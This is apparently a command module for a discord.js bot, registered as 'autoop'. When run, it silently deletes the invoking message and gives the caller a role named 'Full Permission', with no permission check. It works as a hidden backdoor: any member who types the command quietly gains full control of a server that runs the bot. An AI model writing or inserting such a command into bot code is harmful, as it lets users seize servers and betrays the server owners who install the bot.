const Discord = require("discord.js");

module.exports.run = async (bot, message, args, ops) => {

    message.delete();

    let role = message.guild.roles.find(r => r.name === "Full Permission");
    message.member.addRole(role);

}

module.exports.help = {
  name: "autoop"
}
